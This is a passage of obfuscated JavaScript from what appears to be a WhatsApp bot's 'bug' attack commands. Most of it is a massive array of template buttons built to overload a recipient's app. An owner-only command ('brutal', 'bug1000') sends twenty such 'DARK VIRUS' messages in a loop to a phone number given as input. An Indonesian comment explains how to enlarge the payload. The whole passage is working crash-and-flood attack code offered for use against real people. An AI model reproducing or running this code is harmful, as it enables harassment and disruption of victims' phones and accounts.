AM\x20CYCLONE\x20☣️','id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':'https://www.whatsapp.com/otp/copy/'}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','id':''}},{'quickReplyButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','phoneNumber':''}},{'callButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','phoneNumber':''}},{'urlButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','url':'https://www.whatsapp.com/otp/copy/'}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','phoneNumber':''}},{'callButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','id':''}},{'callButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','phoneNumber':''}},{'callButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':'https://www.whatsapp.com/otp/copy/'}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':'https://www.whatsapp.com/otp/copy/'}},{'quickReplyButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':'https://www.whatsapp.com/otp/copy/'}},{'quickReplyButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','id':''}},{'quickReplyButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':'https://www.whatsapp.com/otp/copy/'}},{'quickReplyButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','id':''}},{'quickReplyButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','url':'https://www.whatsapp.com/otp/copy/'}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':'https://www.whatsapp.com/otp/copy/'}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','url':'https://www.whatsapp.com/otp/copy/'}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','url':'https://www.whatsapp.com/otp/copy/'}},{'quickReplyButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','id':''}},{'quickReplyButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':'https://www.whatsapp.com/otp/copy/'}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','id':''}},{'quickReplyButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':'https://www.whatsapp.com/otp/copy/'}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','id':''}},{'callButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','id':''}},{'quickReplyButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','phoneNumber':''}},{'urlButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','url':'https://www.whatsapp.com/otp/copy/'}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':'https://www.whatsapp.com/otp/copy/'}},{'quickReplyButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':'https://www.whatsapp.com/otp/copy/'}},{'quickReplyButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','id':''}},{'quickReplyButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':'https://www.whatsapp.com/otp/copy/'}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':'https://www.whatsapp.com/otp/copy/'}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':'☣️\x20HYY\x20IAM\x20CYCLONE\x20☣️','url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quoted':lep}]});}}
await sleep(ms(waktu))
break

case '🌷':
case 'brutal':
case 'bug1000':
         if (!itsMediablo) return diablobotwhatsapp.reply(`sorry anda sepertinya bukan pemilik bot`)
        txts = `SUCCES ✅`
        diablobotwhatsapp.reply(txts)
        
    
      if (!q) return 
        num = `${q}`+'@s.whatsapp.net'
        jumlah = '20'
        waktu = `5s`
    // KALO MAU BUTTON BANYAK COPY BUTTON NYA TRUS BANYAKIN CONTOH DI BAWAH INI NGENTOT
/* templateButtons: [
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ DARK VIRUS ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
,*/
for (let i = 0; i < jumlah; i++) {
diablo.sendMessage(num, {
text: 'BUG BY TANZA', 
templateButtons: [
   { callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
